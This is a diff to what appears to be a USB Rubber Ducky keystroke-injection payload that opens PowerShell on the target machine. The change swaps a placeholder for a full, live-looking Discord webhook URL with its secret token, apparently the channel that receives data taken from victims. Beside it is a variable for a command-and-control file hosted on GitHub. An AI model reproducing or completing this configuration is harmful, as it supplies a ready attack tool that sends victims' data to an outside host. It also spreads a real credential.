@@ -20,7 +20,7 @@ STRING powershell
 ENTER
 DELAY 2000
 REM Put your webhook below.
-STRING $webhook = "DiscordWebhookHere";
+STRING $webhook = "https://discordapp.com/api/webhooks/1140518841013772428/7S-D4i3B6eluHM8fTOXj4VmrUdHK3MHTzoQeoy1-kvaEtFj0hMR3wg5G_ejFs1aWCoIL";
 REM C2 file must be hosted at GitHub unless you can edit the file. 1 = ON and 0 = OFF 
 STRING $ccontrol = "C2FileHere";
 REM Put it all together now..
